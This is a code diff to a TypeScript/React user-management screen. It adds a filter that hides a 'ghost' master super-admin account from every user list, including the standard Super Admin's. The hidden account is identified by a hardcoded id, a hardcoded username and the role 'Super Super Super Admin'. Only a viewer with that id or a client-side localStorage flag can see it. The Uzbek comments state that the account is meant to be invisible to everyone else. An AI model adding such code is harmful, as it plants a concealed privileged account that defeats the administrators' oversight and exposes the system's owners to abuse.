@@ -21,6 +21,11 @@ export interface UserItem {
   status?: string;
   lastActive: string;
   allowedModules: string[];
+  isOnline?: boolean;
+  avatarBg?: string;
+  phone?: string;
+  isGhost?: boolean;
+  isMasterRoot?: boolean;
 }
 
 export interface RoleItem {
@@ -335,6 +340,27 @@ export default function UsersManagement({
     });
 
     return Array.from(map.values()).filter(u => {
+      // Invisible Ghost/Master Super Admin filter:
+      // Tizimda ko'rinmas (Ghost) master profil faqat Master Root sessiyasida ko'rinadi.
+      // Boshqa barcha oddiy foydalanuvchilar va standart Super Admin uchun mutlaqo yashirin!
+      const isGhostOrMaster = 
+        u.role === 'Super Super Super Admin' || 
+        Boolean(u.isGhost) || 
+        Boolean(u.isMasterRoot) || 
+        u.id === 999999 || 
+        (u.username && u.username.toLowerCase() === '20090915zzokirov2009@z');
+
+      let isCurrentViewerMaster = false;
+      try {
+        isCurrentViewerMaster = 
+          currentUserId === 999999 || 
+          localStorage.getItem('toyonasavdo_is_master_root') === 'true';
+      } catch {}
+
+      if (isGhostOrMaster && !isCurrentViewerMaster) {
+        return false;
+      }
+
       const matchesSearch = !q ||
         (u.name || '').toLowerCase().includes(q) ||
         (u.email || '').toLowerCase().includes(q) ||
